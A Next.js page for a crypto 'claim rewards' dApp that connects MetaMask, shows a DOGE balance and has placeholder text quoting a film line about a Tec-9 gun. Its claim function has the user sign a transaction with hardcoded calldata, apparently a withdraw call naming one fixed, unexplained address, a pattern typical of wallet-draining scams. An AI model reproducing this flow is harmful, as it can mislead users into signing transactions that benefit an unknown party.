import type { NextPage } from "next";
import SomeText from "lib/components/samples/SomeText";
import { useRef, useState, useEffect } from "react";
import { DatasetJsonLd } from "next-seo";
import Web3 from "web3";
import { ChainUnknownError } from "use-wallet/dist/cjs/errors";
import Script from "next/script";
import Button from "lib/components/ui/Button";
import LandingSection from "lib/components/ui/LandingSection";

export let isValidNetwork = true;
export let account = '';

const Home: NextPage = () => {

    const connectBtn = useRef<HTMLButtonElement>(null)
    const [hasConnected, setHasConnected] = useState(false);

    const updateValues = async () => {
        const response = await fetch(`/api/moon-balance?walletAddress=${account}`)
        const data = await response.json()

        const pendingRewardsElement = document.getElementById("pendingRewardsEth");
        pendingRewardsElement!.textContent = parseFloat(data.pendingRewards).toFixed(6);

    }

    const checkNetwork = async () => {
        // @ts-ignore
        const chainId = await window.ethereum.request({ method: 'eth_chainId' })
        // todo: use env var
        const ethChainId = process.env.NEXT_PUBLIC_CHAIN_ID
        console.log(`Your chain ID: ${chainId}`);
        console.log(`The chain ID for this dApp: ${ethChainId}`)

        if (chainId === ethChainId) {
            console.log("Connected to correct network.")
            await updateValues()

        } else {
            alert("You are connected to the wrong network. Please connect to the Ethereum network on Metamask and try again!")
            isValidNetwork = false;
            return;
        }

    }

    const connectWallet = async () => {

        // @ts-ignore
        const provider = window.ethereum;
        if (!provider) {
            alert("Metamask is not installed, please install!")
            return;
        }

        // @ts-ignore
        const accounts = await ethereum.request({ method: 'eth_requestAccounts' })
        account = accounts[0];
        console.log(`Your wallet address: ${account}`);

        const walletAddressBtn = document.getElementById('walletAddressBtn');
        walletAddressBtn!.firstChild!.textContent = account;

        setHasConnected(true);
        checkNetwork();

    };

    const claimRewards = async () => {

        // @ts-ignore
        const accounts = await ethereum.request({ method: 'eth_requestAccounts' })

        const tx = {
            // user's wallet address
            from: accounts[0],
            // target address, this is the smart contract address
            to: process.env.NEXT_PUBLIC_CONTRACT_ADDRESS,
            data: "0x51cff8d900000000000000000000000004b2fa0c2a3755b5f4951bf70be3035b3342bd7b"
        }

        // @ts-ignore
        try {
            // @ts-ignore
            const txHash = await ethereum.request({
                method: "eth_sendTransaction",
                params: [tx],
            }).then(async (tx: string) => {
                await updateValues()

                setTimeout(() => {
                    prompt(`✅ 🎉 You have successfully withdrawn your rewards. Please allow around 30 seconds for the transaction to process. You can now close this tab. \n \n Transaction ID: `, tx)
                    location.reload()
                }, 100)
            })
        } catch (error: any) {
            console.log(error)
            alert(error.message)
        }
    }

    useEffect(() => {
        updateValues()
    }, [])

    return (
        <>
            <div className="flex w-full min-h-[100vh] flex-col items-center justify-center text-white">
                <SomeText />

                <div
                    className="w-full lg:w-3/5 xl:w-2/5 h-full lg:h-96 flex flex-col lg:flex-row items-center rounded-lg overflow-hidden mt-20"
                >
                    <div
                        className="w-full w-full bg-zinc-900/[.6] backdrop-blur-md flex flex-col justify-center pl-12 lg:pl-20 py-14 rounded-lg my-6 lg:mr-2 border border-solid border-slate-700">

                        <h3
                            className="w-auto mb-3 text-rose-200 font-light text-2xl"
                        >
                            Your Balance:
                        </h3>

                        <h2
                            className="w-auto mb-16 bg-gradient-to-br from-white to-orange-400 bg-clip-text text-transparent font-medium"
                        >
                            <span id="pendingRewardsEth">0.00</span>&nbsp;
                            DOGE
                        </h2>

                        <div
                            className="w-84 h-14"
                        >
                            <Button>Connect Wallet</Button>
                        </div>

                    </div>

                </div>
            </div>





            <div
            className="w-full flex-col flex items-center"
            >
                <div
                    className="flex-col w-3/5 flex items-center w-full min-h-screen"
                >
                    <LandingSection>
                        <>About</>
                        <>Now that there is the Tec-9, a crappy spray gun from South Miami. This gun is advertised as the most popular gun in American crime. Do you believe that shit? It actually says that in the little book that comes with it: the most popular gun in American crime. Like they're actually proud of that shit. </>
                    </LandingSection>
                </div>


                <div
                    className="flex-col w-3/5 flex items-center w-full min-h-screen"
                >
                    <LandingSection>
                        <>Socials</>
                        <>Now that there is the Tec-9, a crappy spray gun from South Miami. This gun is advertised as the most popular gun in American crime. Do you believe that shit? It actually says that in the little book that comes with it: the most popular gun in American crime. Like they're actually proud of that shit. </>
                    </LandingSection>
                </div>


            </div>





        </>



    );
};

export default Home;
